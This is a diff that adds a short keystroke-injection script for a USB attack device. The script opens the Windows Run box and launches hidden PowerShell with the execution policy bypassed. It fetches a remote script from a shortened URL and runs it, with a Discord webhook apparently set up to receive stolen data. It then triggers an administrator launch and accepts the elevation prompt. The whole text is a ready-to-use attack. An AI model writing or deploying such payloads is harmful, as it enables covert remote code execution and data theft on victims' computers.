@@ -1,0 +1,10 @@
+DELAY 1000
+GUI R
+DELAY 300
+STRING powershell -W h -NonI -NoP -Ep bypass -c "$dc = 'your discord webhook here'; irm https://shorturl.at/kmuWX | iex"
+DELAY 100
+CTRL SHIFT ENTER
+DELAY 300
+SHIFT TAB
+DELAY 200
+ENTER
